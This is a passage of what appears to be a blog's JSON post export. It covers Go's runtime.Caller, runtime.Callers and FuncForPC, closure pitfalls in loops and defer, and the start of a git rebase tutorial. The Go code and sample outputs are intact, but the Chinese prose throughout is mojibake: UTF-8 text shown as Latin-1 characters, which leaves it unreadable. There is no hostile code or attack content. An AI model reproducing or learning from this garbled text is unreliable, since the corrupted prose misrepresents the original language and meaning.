ä¸ºå¼€å§‹åœ¨ pc ä¸­è®°å½•ä¹‹å‰æ‰€è¦è·³è¿‡çš„æ ˆå¸§æ•°,Â **è‹¥ä¸º 0 åˆ™è¡¨ç¤ºÂ runtime.CallersÂ è‡ªèº«çš„æ ˆå¸§, è‹¥ä¸º 1 åˆ™è¡¨ç¤ºè°ƒç”¨è€…çš„æ ˆå¸§**. è¯¥å‡½æ•°è¿”å›å†™å…¥åˆ°Â `pc`Â åˆ‡ç‰‡ä¸­çš„é¡¹æ•°(å—åˆ‡ç‰‡çš„å®¹é‡é™åˆ¶).\n\n\n\nä¸‹é¢æ˜¯Â `runtime.Callers`Â çš„ä¾‹å­, ç”¨äºè¾“å‡ºæ¯ä¸ªæ ˆå¸§çš„Â `pc`Â ä¿¡æ¯:\n\n```\nfunc main() {\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t}\n\t// Output:\n\t// skip = 0, pc = [4304486 4198562 4280114 4289760]\n\t// skip = 1, pc = [4198562 4280114 4289760]\n\t// skip = 2, pc = [4280114 4289760]\n\t// skip = 3, pc = [4289760]\n}\n```\n\nè¾“å‡ºæ–°çš„Â `pc`Â é•¿åº¦å’ŒÂ `skip`Â å¤§å°æœ‰é€†ç›¸å…³æ€§.Â `skip = 0`Â ä¸ºÂ `runtime.Callers`Â è‡ªèº«çš„ä¿¡æ¯.\n\nè¿™ä¸ªä¾‹å­æ¯”å‰ä¸€ä¸ªä¾‹å­å¤šè¾“å‡ºäº†ä¸€ä¸ªæ ˆå¸§, å°±æ˜¯å› ä¸ºå¤šäº†ä¸€ä¸ª `runtime.Callers` æ ˆå¸§çš„ä¿¡æ¯ (å‰ä¸€ä¸ªä¾‹å­æ˜¯æ²¡æœ‰ `runtime.Caller` ä¿¡æ¯çš„(*æ³¨æ„:æ²¡æœ‰ s åç¼€*)).\n\n\n\n## runtime.Callers å’Œ runtime.Caller çš„å¼‚åŒ\n\nå› ä¸ºå‰é¢2ä¸ªä¾‹å­ä¸ºä¸åŒçš„ç¨‹åº, è¾“å‡ºçš„ `pc` å€¼å¹¶ä¸å…·å¤‡å‚è€ƒæ€§. ç°åœ¨æˆ‘ä»¬çœ‹çœ‹åœ¨åŒä¸€ä¸ªä¾‹å­çš„è¾“å‡ºç»“æœå¦‚ä½•:\n\n \n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tpc, file, line, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v, file = %v, line = %v\\n\", skip, pc, file, line)\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198456, file = caller.go, line = 10\n\t// skip = 1, pc = 4280962, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\n\t// skip = 2, pc = 4290608, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t}\n\t// Output:\n\t// skip = 0, pc = [4305334 4198635 4280962 4290608]\n\t// skip = 1, pc = [4198635 4280962 4290608]\n\t// skip = 2, pc = [4280962 4290608]\n\t// skip = 3, pc = [4290608]\n}\n```\n\næ¯”å¦‚è¾“å‡ºç»“æœå¯ä»¥å‘ç°, `4280962` å’Œ `4290608` ä¸¤ä¸ª `pc` å€¼æ˜¯ç›¸åŒçš„. å®ƒä»¬åˆ†åˆ«å¯¹åº” `runtime.main` å’Œ `runtime.goexit` å‡½æ•°.\n\n\n\n`runtime.Caller` è¾“å‡ºçš„ `4198456` å’Œ `runtime.Callers` è¾“å‡ºçš„ `4198635` å¹¶ä¸ç›¸åŒ. è¿™æ˜¯å› ä¸º, è¿™ä¸¤ä¸ªå‡½æ•°çš„è°ƒç”¨ä½ç½®å¹¶ä¸ç›¸åŒ, å› æ­¤å¯¼è‡´äº† `pc` å€¼ä¹Ÿä¸å®Œå…¨ç›¸åŒ.\n\n\n\næœ€åå°±æ˜¯ `runtime.Callers` å¤šè¾“å‡ºä¸€ä¸ª `4305334` å€¼, å¯¹åº”`runtime.Callers`å†…éƒ¨çš„è°ƒç”¨ä½ç½®.\n\nç”±äºGoè¯­è¨€(Go1.2)é‡‡ç”¨åˆ†æ®µå †æ ˆ, å› æ­¤ä¸åŒçš„ `pc` ä¹‹é—´çš„å¤§å°å…³ç³»å¹¶ä¸æ˜æ˜¾.\n\n\n\n## runtime.FuncForPC çš„ç”¨é€”\n\nå‡½æ•°çš„ç­¾åå¦‚ä¸‹:\n\n```\nfunc runtime.FuncForPC(pc uintptr) *runtime.Func\nfunc (f *runtime.Func) FileLine(pc uintptr) (file string, line int)\nfunc (f *runtime.Func) Entry() uintptr\nfunc (f *runtime.Func) Name() string\n```\n\n\n\nå…¶ä¸­ `runtime.FuncForPC` è¿”å›åŒ…å«ç»™å®š `pc` åœ°å€çš„å‡½æ•°, å¦‚æœæ˜¯æ— æ•ˆ `pc` åˆ™è¿”å› `nil` .\n\n`runtime.Func.FileLine` è¿”å›ä¸ `pc` å¯¹åº”çš„æºç æ–‡ä»¶åå’Œè¡Œå·. å®‰è£…æ–‡æ¡£çš„è¯´æ˜, å¦‚æœ`pc`ä¸åœ¨å‡½æ•°å¸§èŒƒå›´å†…, åˆ™ç»“æœæ˜¯ä¸ç¡®å®šçš„.\n\n`runtime.Func.Entry` å¯¹åº”å‡½æ•°çš„åœ°å€. \n\n`runtime.Func.Name` è¿”å›è¯¥å‡½æ•°çš„åç§°. \n\n\n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tpc, _, _, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tp := runtime.FuncForPC(pc)\n\t\tfile, line := p.FileLine(0)\n\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc)\n\t\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\t\tfmt.Printf(\"  entry = %v\\n\", p.Entry())\n\t\tfmt.Printf(\"  name = %v\\n\", p.Name())\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198456\n\t//   file = caller.go, line = 8\n\t//   entry = 4198400\n\t//   name = main.main\n\t// skip = 1, pc = 4282882\n\t//   file = $(GOROOT)/src/pkg/runtime/proc.c, line = 179\n\t//   entry = 4282576\n\t//   name = runtime.main\n\t// skip = 2, pc = 4292528\n\t//   file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\t//   entry = 4292528\n\t//   name = runtime.goexit\n\t\n\t\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t\tfor j := 0; j < n; j++ {\n\t\t\tp := runtime.FuncForPC(pc[j])\n\t\t\tfile, line := p.FileLine(0)\n\n\t\t\tfmt.Printf(\"  skip = %v, pc = %v\\n\", skip, pc[j])\n\t\t\tfmt.Printf(\"    file = %v, line = %d\\n\", file, line)\n\t\t\tfmt.Printf(\"    entry = %v\\n\", p.Entry())\n\t\t\tfmt.Printf(\"    name = %v\\n\", p.Name())\n\t\t}\n\t\tbreak\n\t}\n\t// Output:\n\t// skip = 0, pc = [4307254 4198586 4282882 4292528]\n\t//   skip = 0, pc = 4307254\n\t//     file = $(GOROOT)/src/pkg/runtime/runtime.c, line = 315\n\t//     entry = 4307168\n\t//     name = runtime.Callers\n\t//   skip = 0, pc = 4198586\n\t//     file = caller.go, line = 8\n\t//     entry = 4198400\n\t//     name = main.main\n\t//   skip = 0, pc = 4282882\n\t//     file = $(GOROOT)/src/pkg/runtime/proc.c, line = 179\n\t//     entry = 4282576\n\t//     name = runtime.main\n\t//   skip = 0, pc = 4292528\n\t//     file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\t//     entry = 4292528\n\t//     name = runtime.goexit\n}\n```\n\n\n\næ ¹æ®æµ‹è¯•, å¦‚æœæ˜¯æ— æ•ˆÂ `pc`Â (æ¯”å¦‚`0`),Â `runtime.Func.FileLine`Â ä¸€èˆ¬ä¼šè¾“å‡ºå½“å‰å‡½æ•°çš„å¼€å§‹è¡Œå·. ä¸è¿‡åœ¨å®è·µä¸­, ä¸€èˆ¬ä¼šç”¨Â `runtime.Caller`Â è·å–æ–‡ä»¶åå’Œè¡Œå·ä¿¡æ¯,Â `runtime.Func.FileLine`Â å¾ˆå°‘ç”¨åˆ°.\n\n\n\n## å®šåˆ¶çš„ CallerName å‡½æ•°\n\nåŸºäºå‰é¢çš„å‡ ä¸ªå‡½æ•°, æˆ‘ä»¬å¯ä»¥æ–¹ä¾¿çš„å®šåˆ¶ä¸€ä¸ªÂ `CallerName`Â å‡½æ•°. å‡½æ•°Â `CallerName`Â è¿”å›è°ƒç”¨è€…çš„å‡½æ•°å/æ–‡ä»¶å/è¡Œå·ç­‰ç”¨æˆ·å‹å¥½çš„ä¿¡æ¯.\n\n\n\n```\nfunc CallerName(skip int) (name, file string, line int, ok bool) {\n\tvar pc uintptr\n\tif pc, file, line, ok = runtime.Caller(skip + 1); !ok {\n\t\treturn\n\t}\n\tname = runtime.FuncForPC(pc).Name()\n\treturn\n}\n```\n\nå…¶ä¸­åœ¨æ‰§è¡Œ `runtime.Caller` è°ƒç”¨æ—¶, å‚æ•° `skip + 1` ç”¨äºæŠµæ¶ˆ `CallerName` å‡½æ•°è‡ªèº«çš„è°ƒç”¨.\n\n\n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v\\n\", skip)\n\t\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\t\tfmt.Printf(\"  name = %v\\n\", name)\n\t}\n\t// Output:\n\t// skip = 0\n\t//   file = caller.go, line = 19\n\t//   name = main.main\n\t// skip = 1\n\t//   file = C:/go/go-tip/src/pkg/runtime/proc.c, line = 220\n\t//   name = runtime.main\n\t// skip = 2\n\t//   file = C:/go/go-tip/src/pkg/runtime/proc.c, line = 1394\n\t//   name = runtime.goexit\n}\n```\n\n\n\n## Go è¯­è¨€ä¸­å‡½æ•°çš„ç±»å‹\n\nåœ¨ Go è¯­è¨€ä¸­, é™¤äº†è¯­è¨€å®šä¹‰çš„æ™®é€šå‡½æ•°è°ƒç”¨å¤–, è¿˜æœ‰é—­åŒ…å‡½æ•°/initå‡½æ•°/å…¨å±€å˜é‡åˆå§‹åŒ–ç­‰ä¸åŒçš„å‡½æ•°è°ƒç”¨ç±»å‹.\n\nä¸ºäº†ä¾¿äºæµ‹è¯•ä¸åŒç±»å‹çš„å‡½æ•°è°ƒç”¨, æˆ‘ä»¬åŒ…è£…ä¸€ä¸ª `PrintCallerName` å‡½æ•°. è¯¥å‡½æ•°ç”¨äºè¾“å‡ºè°ƒç”¨è€…çš„ä¿¡æ¯.\n\n```\nfunc PrintCallerName(skip int, comment string) bool {\n\tname, file, line, ok := CallerName(skip + 1)\n\tif !ok {\n\t\treturn false\n\t}\n\tfmt.Printf(\"skip = %v, comment = %s\\n\", skip, comment)\n\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\tfmt.Printf(\"  name = %v\\n\", name)\n\treturn true\n}\n```\n\n\n\nç„¶åç¼–å†™ä»¥ä¸‹çš„æµ‹è¯•ä»£ç (å‡½æ•°é—­åŒ…è°ƒç”¨/å…¨å±€å˜é‡åˆå§‹åŒ–/initå‡½æ•°ç­‰):\n\n```\nvar a = PrintCallerName(0, \"main.a\")\nvar b = PrintCallerName(0, \"main.b\")\n\nfunc init() {\n\ta = PrintCallerName(0, \"main.init.a\")\n}\n\nfunc init() {\n\tb = PrintCallerName(0, \"main.init.b\")\n\tfunc() {\n\t\tb = PrintCallerName(0, \"main.init.b[1]\")\n\t}()\n}\n\nfunc main() {\n\ta = PrintCallerName(0, \"main.main.a\")\n\tb = PrintCallerName(0, \"main.main.b\")\n\tfunc() {\n\t\tb = PrintCallerName(0, \"main.main.b[1]\")\n\t\tfunc() {\n\t\t\tb = PrintCallerName(0, \"main.main.b[1][1]\")\n\t\t}()\n\t\tb = PrintCallerName(0, \"main.main.b[2]\")\n\t}()\n}\n```\n\nè¾“å‡ºç»“æœå¦‚ä¸‹:\n\n```\n// Output:\n// skip = 0, comment = main.a\n//   file = caller.go, line = 8\n//   name = main.init\n// skip = 0, comment = main.b\n//   file = caller.go, line = 9\n//   name = main.init\n// skip = 0, comment = main.init.a\n//   file = caller.go, line = 12\n//   name = main.initÂ·1\n// skip = 0, comment = main.init.b\n//   file = caller.go, line = 16\n//   name = main.initÂ·2\n// skip = 0, comment = main.init.b[1]\n//   file = caller.go, line = 18\n//   name = main.funcÂ·001\n// skip = 0, comment = main.main.a\n//   file = caller.go, line = 23\n//   name = main.main\n// skip = 0, comment = main.main.b\n//   file = caller.go, line = 24\n//   name = main.main\n// skip = 0, comment = main.main.b[1]\n//   file = caller.go, line = 26\n//   name = main.funcÂ·003\n// skip = 0, comment = main.main.b[1][1]\n//   file = caller.go, line = 28\n//   name = main.funcÂ·002\n// skip = 0, comment = main.main.b[2]\n//   file = caller.go, line = 30\n//   name = main.funcÂ·003\n```\n\n\n\nè§‚å¯Ÿè¾“å‡ºç»“æœ, å¯ä»¥å‘ç°ä»¥ä¸‹å‡ ä¸ªè§„å¾‹:\n\n- å…¨å±€å˜é‡çš„åˆå§‹åŒ–è°ƒç”¨è€…ä¸º `main.init` å‡½æ•°\n- è‡ªå®šä¹‰çš„ `init` å‡½æ•°æœ‰ä¸€ä¸ªæ•°å­—åç¼€, æ ¹æ®å‡ºç°çš„é¡ºåºè¿›ç¼–å·. æ¯”å¦‚ `main.initÂ·1` å’Œ `main.initÂ·2` ç­‰.\n- é—­åŒ…å‡½æ•°é‡‡ç”¨ `main.funcÂ·001` æ ¼å¼å‘½å, å®‰è£…é—­åŒ…å®šä¹‰ç»“æŸçš„ä½ç½®é¡ºåºè¿›ç¼–å·.\n\n \n\n## ä¸åŒ Go ç¨‹åºå¯åŠ¨æµç¨‹\n\nåŸºäºå‡½æ•°è°ƒç”¨è€…ä¿¡æ¯å¯ä»¥å¾ˆå®¹æ˜“çš„éªŒè¯å„ç§ç¯å¢ƒçš„ç¨‹åºå¯åŠ¨æµç¨‹.\n\næˆ‘ä»¬éœ€è¦å»ºç«‹ä¸€ä¸ªç‹¬ç«‹çš„ `caller` ç›®å½•, é‡Œé¢æœ‰ä¸‰ä¸ªæµ‹è¯•ä»£ç .\n\n`caller/main.go` ä¸»ç¨‹åº:\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"regexp\"\n\t\"runtime\"\n)\n\nfunc main() {\n\t_ = PrintCallerName(0, \"main.main._\")\n}\n\nfunc PrintCallerName(skip int, comment string) bool {\n\t// å®ç°å’Œå‰é¢çš„ä¾‹å­ç›¸åŒ\n}\n\nfunc CallerName(skip int) (name, file string, line int, ok bool) {\n\t// å®ç°å’Œå‰é¢çš„ä¾‹å­ç›¸åŒ\n}\n```\n\n`caller/main_test.go` ä¸»ç¨‹åºçš„æµ‹è¯•æ–‡ä»¶(åŒåœ¨ä¸€ä¸ª`main`åŒ…):\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"testing\"\n)\n\nfunc TestPrintCallerName(t *testing.T) {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, name = %v, file = %v, line = %v\\n\", skip, name, file, line)\n\t}\n\tt.Fail()\n}\n```\n\n`caller/example_test.go` ä¸»ç¨‹åºçš„åŒ…çš„è°ƒç”¨è€…(åœ¨æ–°çš„`main_test`åŒ…):\n\n```\npackage main_test\n\nimport (\n\tmyMain \".\"\n\t\"fmt\"\n)\n\nfunc Example() {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := myMain.CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, name = %v, file = %v, line = %v\\n\", skip, name, file, line)\n\t}\n\t// Output: ?\n}\n```\n\nç„¶åè¿›å…¥ `caller` ç›®å½•, è¿è¡Œ `go run test` å¯ä»¥å¾—åˆ°ä»¥ä¸‹çš„è¾“å‡ºç»“æœ:\n\n```\nskip = 0, name = caller.TestPrintCallerName, file = caller/main_test.go, line = 10\nskip = 1, name = testing.tRunner, file = $(GOROOT)/src/pkg/testing/testing.go, line = 391\nskip = 2, name = runtime.goexit, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n--- FAIL: TestPrintCallerName (0.00 seconds)\n--- FAIL: Example (2.0001ms)\ngot:\nskip = 0, name = caller_test.Example, file = caller/example_test.go, line = 10\n\nskip = 1, name = testing.runExample, file = $(GOROOT)/src/pkg/testing/example.go, line = 98\nskip = 2, name = testing.RunExamples, file = $(GOROOT)/src/pkg/testing/example.go, line = 36\nskip = 3, name = testing.Main, file = $(GOROOT)/src/pkg/testing/testing.go, line = 404\nskip = 4, name = main.main, file = $(TEMP)/go-build365033523/caller/_test/_testmain.go, line = 51\nskip = 5, name = runtime.main, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\nskip = 6, name = runtime.goexit, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\nwant:\n?\nFAIL\nexit status 1\nFAIL    caller        0.254s\n```\n\nåˆ†æè¾“å‡ºæ•°æ®æˆ‘ä»¬å¯ä»¥å‘ç°, æµ‹è¯•ä»£ç å’Œä¾‹å­ä»£ç çš„å¯åŠ¨æµç¨‹å’Œæ™®é€šçš„ç¨‹åºæµç¨‹éƒ½ä¸å¤ªä¸€æ ·.\n\n`æµ‹è¯•ä»£ç `çš„å¯åŠ¨æµç¨‹:\n\n1. `runtime.goexit` è¿˜æ˜¯å…¥å£\n2. ä½†æ˜¯ `runtime.goexit` ä¸åœ¨è°ƒç”¨ `runtime.main` å‡½æ•°, è€Œæ˜¯è°ƒç”¨ `testing.tRunner` å‡½æ•°\n3. `testing.tRunner` å‡½æ•°ç”± `go test` å‘½ä»¤ç”Ÿæˆ, ç”¨äºæ‰§è¡Œå„ä¸ªæµ‹è¯•å‡½æ•°\n\n`ä¾‹å­ä»£ç `çš„å¯åŠ¨æµç¨‹:\n\n1. `runtime.goexit` è¿˜æ˜¯å…¥å£\n2. ç„¶å `runtime.goexit` è°ƒç”¨ `runtime.main` å‡½æ•°\n3. æœ€ç»ˆ `runtime.main` **è°ƒç”¨go test å‘½ä»¤ç”Ÿæˆçš„ main.main å‡½æ•°**, åœ¨ `_test/_testmain.go` æ–‡ä»¶\n4. ç„¶åè°ƒç”¨ `testing.Main`, æ”¹å‡½æ•°æ‰§è¡Œå„ä¸ªä¾‹å­å‡½æ•°\n\nå¦å¤–, ä»è¿™ä¸ªä¾‹å­æˆ‘ä»¬å¯ä»¥å‘ç°, æˆ‘ä»¬è‡ªå·±å†™çš„ `main.main` å‡½æ•°æ‰€åœ¨çš„ `main` åŒ…ä¹Ÿ å¯ä»¥è¢«å…¶ä»–åŒ…å¯¼å…¥. ä½†æ˜¯å…¶ä»–åŒ…å¯¼å…¥ä¹‹åçš„ `main` åŒ…é‡Œçš„ `main` å‡½æ•°å°±ä¸å†æ˜¯ `main.main` å‡½æ•°äº†. å› æ­¤, ç¨‹åºçš„å…¥å£ä¹Ÿå°±ä¸æ˜¯è‡ªå·±å†™çš„ `main.main` å‡½æ•°äº†.\n\n\n\n## æ€»ç»“\n\nGo è¯­è¨€ `runtime` åŒ…çš„ `runtime.Caller` / `runtime.Callers` / `runtime.FuncForPC` ç­‰å‡½æ•°è™½ç„¶çœ‹èµ·æ¥æ¯”è¾ƒç®€å•, ä½†æ˜¯åŠŸèƒ½å´éå¸¸å¼ºå¤§.\n\nè¿™å‡ ä¸ªå‡½æ•°ä¸ä»…å¯ä»¥è§£å†³ä¸€äº›å®é™…çš„å·¥ç¨‹é—®é¢˜ , è€Œä¸”éå¸¸é€‚åˆç”¨äºè°ƒè¯•å’Œåˆ†æå„ç§Goç¨‹åºçš„è¿è¡Œæ—¶ä¿¡æ¯.\n","tags":["golang"],"categories":["4_golangå®æˆ˜"]},{"title":"golangé—­åŒ…çš„å‘","url":"%2Fp%2F4c5612cb.html","content":"\n### 1. å¾ªç¯å†…goroutineä½¿ç”¨é—­åŒ…\n\n```go\nfunc main() {\n\ts := []string{\"a\", \"b\", \"c\"}\n\tfor _, v := range s {\n\t\tgo func() {\n\t\t\tfmt.Println(v)\n\t\t}()\n\t}\n\n\ttime.Sleep(time.Second)\n}\n\n\n// c c c \n```\n\næ”¹è¿›:\n\n```go\nfunc main() {                \n    s := []string{\"a\", \"b\", \"c\"}                             \n    for _, v := range s { \n        go func(v string) {\n            fmt.Println(v)\n        }(v)      \n    }                                                                            \n}\n// a b c\n\n\nfunc main() {\n\ts := []string{\"a\", \"b\", \"c\"}\n\tfor _, v := range s {\n\t\tvv := v\n\t\tgo func() {\n\t\t\tfmt.Println(vv)\n\t\t}()\n\t}\n\n\ttime.Sleep(time.Second)\n}\n// a b c\n```\n\n<!-- more -->\n\n### 2. å¾ªç¯å†…é—­åŒ…å‡½æ•°åˆ—è¡¨\n\n```go\nfunc test() []func() {\n    var s []func()\n\n    for i := 0; i < 3; i++ {\n        s = append(s, func() {  \n            fmt.Println(&i, i)\n        })\n    }\n\n    return s    \n}\nfunc main() {\n    for _, f := range test() { \n        f()   \n    }\n}\n\n/*\n0x1400001a0f8 3\n0x1400001a0f8 3\n0x1400001a0f8 3\n*/\n```\n\næ”¹è¿›:\n\n```go\nfunc test() []func() {\n    var s []func()\n    \n    for i := 0; i < 3; i++ {\n        x := i                 \n        s = append(s, func() {\n            fmt.Println(&x, x)\n        })\n    }\n\n    return s\n}\nfunc main() {\n    for _, f := range test() {\n        f()\n    }\n}\n\n/*\n0x1400001a0f8 0\n0x1400001a100 1\n0x1400001a108 2\n*/\n```\n\n\n\n### 3. deferå»¶è¿Ÿè°ƒç”¨é—­åŒ…\n\n```go\nfunc main() {\n\tx, y := 1, 2\n\n\tdefer func(x int) {\n\t\tfmt.Println(\"defer\", \"x\", x, \"y\", y)  // yæ˜¯é—­åŒ…å¼•ç”¨\n\t}(x)\n\n\tx += 100\n\ty += 100\n\tfmt.Println(\"main\", \"x\", x, \"y\", y)\n}\n\n\n\n/*\nmain x 101 y 102\ndefer x 1 y 102\n*/\n```\n","tags":["golang"],"categories":["1_golangåŸºç¡€"]},{"title":"ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git","url":"%2Fp%2Fb1718ace.html","content":"\n\n\n## ä»€ä¹ˆæ˜¯rebase \n\nRebaseå¯¹äºå¾ˆå¤šäººæ¥è¯´æ˜¯ä¸€ä¸ªå¾ˆæŠ½è±¡çš„æ¦‚å¿µï¼Œä¹Ÿå› æ­¤å®ƒçš„å­¦ä¹ é—¨æ§›å°±åœ¨äºå¦‚ä½•äº†è§£è¿™ä¸ªæŠ½è±¡çš„æ¦‚å¿µã€‚å¯¹äºrebaseÂ æ¯”è¾ƒæ°å½“çš„æ¯”å–»åº”è¯¥æ˜¯ã€Œç§»èŠ±æ¥æœ¨ã€ï¼Œç®€å•æ¥è®²æŠŠä½ çš„åˆ†æ”¯æ¥åˆ°åˆ«çš„åˆ†æ”¯ä¸Šï¼Œç¨åæˆ‘ä»¬ç”¨å‡ ä¸ªå›¾æ¥ç¤ºèŒƒmergeä¸rebaseÂ çš„å·®å¼‚ã€‚\n\n\n\näº†è§£rebaseä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»äº†è§£ä»€ä¹ˆæ˜¯baseã€‚å¯¹Gitçš„ä½¿ç”¨è€…è€Œè¨€ï¼Œåœ¨åˆ†æ”¯ä¸­è¿›è¡Œå¼€å‘æ´»åŠ¨æ˜¯ç¨€æ¾å¹³å¸¸çš„äº‹æƒ…ï¼Œä¹Ÿå› æ­¤åœ¨åˆå¹¶ç®¡ç†åˆ†æ”¯æ—¶ï¼Œä¹Ÿå°±éœ€è¦äº†è§£åˆ†æ”¯æ˜¯åœ¨å“ªä¸ªæ—¶é—´ç‚¹å“ªä¸ªæäº¤ç‚¹åˆ†å‡ºæ¥çš„æ—æ”¯ï¼Œè€Œé•¿å‡ºæ—æ”¯æ¥çš„æäº¤ç‚¹ï¼Œå¯¹äºæ—æ”¯æ¥è¯´å°±æ˜¯base commitï¼Œä¹Ÿå°±æ˜¯baseã€‚æ‰€ä»¥ç®€å•æ¥è¯´ï¼Œrebaseå…¶å®å°±æ˜¯æ”¹å˜åˆ†æ”¯çš„baseçš„åŠŸèƒ½ã€‚\n\n \n\nä¸‹å›¾æ˜¯åœ¨mergeçš„æƒ…å†µä¼šäº§ç”Ÿçš„ç‰ˆæœ¬æ¼”è¿›çš„ç¤ºæ„å›¾ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ–°çš„åˆ†æ”¯ä¸­æ‰€åšçš„å˜æ›´ï¼Œåœ¨åˆå¹¶ä¹‹åï¼Œä¸€å¹¶æˆä¸ºä¸€ä¸ªæ–°çš„æäº¤(commit 6)ã€‚è€Œcommit 1å°±æ˜¯New Branchçš„baseã€‚\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/1.png)\n\n\n\n\n\n<!-- more -->\n\nè€Œä¸‹å›¾æ˜¯rebaseÂ çš„æƒ…å†µä¸‹ä¼šäº§ç”Ÿçš„ç‰ˆæœ¬æ¼”è¿›çš„ç¤ºæ„å›¾ã€‚æˆ‘ä»¬åŒæ ·æ˜¯åœ¨åˆ†æ”¯ä¸­è¿›è¡Œå¼€å‘çš„åŠ¨ä½œï¼Œä½†æ˜¯åœ¨rebaseæ—¶ï¼Œä¸mergeä¸åŒçš„æ˜¯ï¼ŒGitä¼šå°†åˆ†æ”¯ä¸Šæ‰€åšçš„å˜æ›´å…ˆæš‚å­˜èµ·æ¥ï¼Œæ¥ç€æŠŠnewbaseÂ (æˆ–ç§°æ–°åŸºå‡†ç‚¹)åˆå¹¶è¿›æ¥ï¼Œæœ€åç›´æ¥å°†åˆšåˆšæš‚å­˜èµ·æ¥çš„å˜æ›´åœ¨åˆ†æ”¯ä¸Šé‡æ¼”ï¼Œè¿™è¾¹ç”¨ã€Œé‡æ¼”ã€è¿™ä¸ªå­—çœ¼æ˜¯è¡¨ç¤ºã€Œ**rebaseä¸æ˜¯å°†æäº¤(commit)å¤åˆ¶åˆ°åˆ†æ”¯ä¸Šï¼Œè€Œæ˜¯å°†æ•´ä¸ªå˜æ›´è¿‡ç¨‹ä¸€ä¸ªä¸€ä¸ªé‡æ–°å¥—ç”¨åˆ°åˆ†æ”¯ä¸Š**ã€ ï¼Œä¹Ÿå°±å› ä¸ºå¦‚æ­¤commit 2'ä¸commit 3'ï¼Œæ‰ä¼šæœ‰å¦å¤–çš„'ç¬¦å·è¡¨ç¤ºä¸åŸæœ¬çš„commit 2Â ,Â commit 3ä¸åŒï¼Œè¿™ç‚¹å¯ä»¥ä»commitçš„SHA1å‡‘å€¼ä¸åŒçœ‹å‡ºæ¥ï¼Œè™½ç„¶å˜æ›´çš„å†…å®¹ç›¸åŒï¼Œä½†æ˜¯commitç¼–å·æ˜¯ä¸åŒçš„ã€‚æœ¬æ–‡ä¼šåœ¨ç¨ååˆ©ç”¨èŒƒä¾‹æ¼”ç¤ºä¸€éã€‚\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/2.png)\n\nä¹Ÿå°±å› ä¸ºå¦‚æ­¤ï¼Œæ‰€ä»¥rebaseçš„è¡Œä¸ºå°±å¾ˆåƒã€Œç§»èŠ±æ¥æœ¨ã€ï¼Œä»¥ä¸Šå›¾æ¥è¯´ï¼Œå°±æ˜¯æŠŠNew Branchçš„å˜æ›´æ•´ä¸ªæ¥åˆ°Masterä¸Šã€‚è¿™æ ·çš„å¥½å¤„å°±æ˜¯ commit æ›´åƒä¸€æ¡ç›´çº¿,æ›´ä¼˜é›….\n\n \n\n\n\n## Rebase -åŸºç¡€ç”¨æ³•\n\nä»¥ä¸‹æˆ‘ä»¬ç”¨ä¸€ä¸ªæƒ…å¢ƒç¤ºèŒƒrebaseçš„ã€ŒåŸºç¡€ç”¨æ³•ã€ï¼š\n\n> ä½ æ˜¯ä¸€ä½team leaderï¼Œä½ çš„å…¶ä¸­ä¸€é¡¹èŒåŠ¡å°±æ˜¯è´Ÿè´£è¿›è¡Œç¨‹å¼ç å®¡æŸ¥(code review)ï¼Œå¹¶ä¸”å°†ä¸åŒç¨‹å¼åˆ†æ”¯è¿›è¡Œåˆå¹¶ç®¡ç†ã€‚\n>\n> ç°åœ¨æœ‰2ä½ç¨‹å¼è®¾è®¡å¸ˆä»¥developåˆ†æ”¯ä¸ºåŸºç¡€ï¼Œåˆ†åˆ«å¼€äº†æ–°çš„åˆ†æ”¯feature-aä¸feature-bï¼Œä¹Ÿéƒ½å·²ç»å®Œå·¥äº†ã€‚ä½ å¸Œæœ›åˆ©ç”¨rebaseçš„æ–¹å¼å°†è¿™2ä¸ªåˆ†æ”¯å¹¶å…¥developä¸­ã€‚\n\n 